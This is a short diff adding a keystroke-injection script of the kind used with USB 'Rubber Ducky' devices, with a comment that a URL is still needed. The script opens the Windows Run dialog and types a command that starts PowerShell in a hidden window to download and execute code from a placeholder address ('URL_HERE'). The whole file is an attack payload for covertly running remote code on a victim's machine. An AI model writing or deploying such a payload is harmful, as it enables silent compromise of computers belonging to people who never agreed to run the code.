@@ -1,0 +1,7 @@
+We need a URL for the powershell code!
+
+SLEEP 600
+GUI r
+DELAY 150
+STRING powershell -windowstyle hidden iex (wget URL_HERE)
+ENTER
